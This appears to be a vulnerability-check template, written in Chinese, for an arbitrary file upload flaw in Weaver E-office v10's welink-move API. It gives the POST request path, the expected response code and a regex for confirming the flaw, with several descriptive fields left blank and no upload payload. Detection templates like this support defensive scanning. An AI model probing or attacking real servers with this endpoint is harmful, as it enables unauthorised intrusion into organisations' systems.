﻿# 泛微 E-office v10 welink-move任意文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /eoffice10/server/public/api/welink/welink-move HTTP/1.1
Accept-Encoding: gzip
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?code)(?=.*?0x000013).*?$

> 上传文件定位：

> 验证文件来源：泛微 E-office v10 welink-move任意文件上传漏洞.poc
